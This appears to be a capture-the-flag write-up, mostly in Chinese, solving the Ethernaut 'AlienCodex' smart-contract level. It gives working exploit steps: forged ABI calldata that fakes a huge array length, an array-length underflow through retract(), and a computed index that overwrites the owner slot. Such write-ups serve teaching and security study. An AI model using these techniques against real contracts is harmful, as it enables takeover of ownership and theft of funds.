## 0x01 Task

```javascript
pragma solidity ^0.4.24;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact(bytes32[] _firstContactMessage) public {
    assert(_firstContactMessage.length > 2**200);
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

You've uncovered an Alien contract. Claim ownership to complete the level.

## 0x02 need2know

AlienCodex是继承自Ownable合约的，而在Ownable合约中其实存在变量`_owner`，我们的目标就是要想办法把`_owner`改成自己的地址。

再看到AlienCodex合约里面，很多方法都添加了contacted修饰符，我们也应当把`contact`改成`true`。

看到`make_contact`函数，里面有把`contact`设置为`true`的操作，但是存在限制检查`assert(_firstContactMessage.length > 2**200)`。想了一下2^200基本上在内存中也装不下这么大的东西。

这里要知道：当您调用方法传递数组时，solidity不会根据实际有效负载对数组大小进行检查。

根据Contract ABI，并拿单变量函数`make_contact(bytes32[] _firstContactMessage)`举例，参数应当参照下面的结构：

- 4 bytes of a hash of the signature of the function
- the location of the data part of bytes32[]
- the length of the bytes32[] array
- the actual data.

接下来把他们都计算出来：

`web3.sha3('make_contact(bytes32[])')`

`0x1d3d4c0b6dd3cffa8438b3336ac6e7cd0df521df3bef5370f94efed6411c1a65`

 take first 4 bytes, so `0x1d3d4c0b` our desired result.

偏移就是32bytes

`0x0000000000000000000000000000000000000000000000000000000000000020`

大于2^200的长度

`0x1000000000000000000000000000000000000000000000000000000000000001`

实际数据不用放。

```javascript
sig = web3.sha3("make_contact(bytes32[])").slice(0,10)
// "0x1d3d4c0b"
data1 = "0000000000000000000000000000000000000000000000000000000000000020"
// 除去函数选择器，数组长度的存储从第 0x20 位开始
data2 = "1000000000000000000000000000000000000000000000000000000000000001"
// 数组的长度
await contract.contact()
// false
contract.sendTransaction({data: sig + data1 + data2});
// 发送交易
await contract.contact()
// true
```

`contact`被我们设置成true了以后，能用的函数就变多了。接下来要修改的是Ownable合约中其实存在变量`_owner`，但是看看源码好像没有相关的修改表达式，那就换个想法，从合约内部存储原理入手。

`_owner`被存储在合约的slot0上，而`codex`数组存储在slot1上。因为EVM的优化存储，并且地址类型占据20bytes，bool占据1byte，所以他们都能存储在一个大小为32bytes的slot中。EVM的存储位置计算规则，对于codex数组来说就是`keccak256(bytes32(1))`：

| Slot #           | Variable                                                     |
| ---------------- | ------------------------------------------------------------ |
| 0                | contact bool(1 bytes] & owner address (20 bytes), both fit on one slot |
| 1                | codex.length                                                 |
| keccak256(1)     | codex[0]                                                     |
| keccak256(1) + 1 | codex[1]                                                     |
|                  |                                                              |
| 2²⁵⁶ - 1         | codex[2²⁵⁶ - 1 - uint(keccak256(1))]                         |
| 0                | codex[2²⁵⁶ - 1 - uint(keccak256(1)) + 1] --> can write slot 0! |

```javascript
contract Calc {
    
    bytes32 public one;
    uint public index;
    uint public length;
    bytes32 public lengthBytes;
    
    function getIndex() {
        one = keccak256(bytes32(1));
        index = 2 ** 256 - 1 - uint(one) + 1;
    }
}
```

得到计算结果后：

```javascript
contract.retract() // 先让数组长度溢出
contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000000899f879df02dc33893c54d6D02A3b2D6bBE144Df', {from:player, gas: 900000});

```



